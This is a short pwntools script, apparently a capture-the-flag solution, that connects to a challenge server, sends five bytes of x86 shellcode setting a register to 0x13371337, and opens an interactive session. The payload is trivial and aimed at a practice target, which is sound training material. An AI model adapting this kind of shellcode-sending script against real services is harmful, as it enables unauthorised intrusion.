from pwn import *

io = connect("shellone.challs.havce.it", 1337)
header = io.recvuntil(b">")
print(header)
io.send(b"\xB8\x37\x13\x37\x13")
io.interactive()


